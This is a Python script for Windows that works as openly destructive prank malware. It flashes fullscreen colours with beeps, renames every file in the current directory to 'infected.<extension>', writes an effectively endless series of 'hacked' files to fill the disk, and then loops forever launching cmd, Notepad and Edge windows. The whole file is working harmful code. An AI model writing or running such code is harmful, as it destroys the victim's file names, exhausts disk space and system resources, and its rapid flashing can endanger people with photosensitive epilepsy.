import tkinter as tk
import random
import time
import winsound
import os

root = tk.Tk()
root.attributes("-fullscreen", True)  
root.bind("<Escape>", lambda e: root.quit())  

def flash_colors():
    colors = ["red", "blue", "green", "yellow", "purple", "orange", "pink"]
    for _ in range(50): 
        color = random.choice(colors)
        root.configure(bg=color)  
        winsound.Beep(900, 105)
        root.update()  
        time.sleep(0.11111155555)  
    root.configure(bg="black")  

flash_colors()


root.update()

def search(path="."):
    normalFiles = set()  
    maxLength = fileLength()
    for filename in os.listdir(path):  
        print(filename, end='')
        if filename.startswith("infected"):
            printSpace(filename, " Infected", maxLength)
        elif filename == os.path.basename(__file__):
            printSpace(filename, " Infected", maxLength)
        else:
            printSpace(filename, " not infected yet...", maxLength)
            normalFiles.add(filename)
    return normalFiles

def fileLength():
    maxLength = 0
    for filename in os.listdir(os.getcwd()):  
        stringLength = len(filename)
        if stringLength > maxLength:
            maxLength = stringLength
    return maxLength

def printSpace(filename, msg, maxLength):
    realLength = maxLength - len(filename)
    for x in range(realLength): 
        print(" ", end='')
    print(" " + msg)

def infect(filelist):
    for filename in filelist:
        print("Infecting... " + filename)
        try:
            os.rename(filename, "infected." + str(filename.split(".")[-1]))
            print("    Success Infected")
        except Exception as e:
            print("Infect failed: ", e)


filelist = search()


infect(filelist)


max_files = 999999999999999999999999
for i in range(1, max_files + 1):
    with open(f"hello{i}.vasta", "w") as file:
        file.write("hacked")


while True:
    os.system('start cmd')
    os.system('start notepad')
    os.system('start microsoftedge')

 

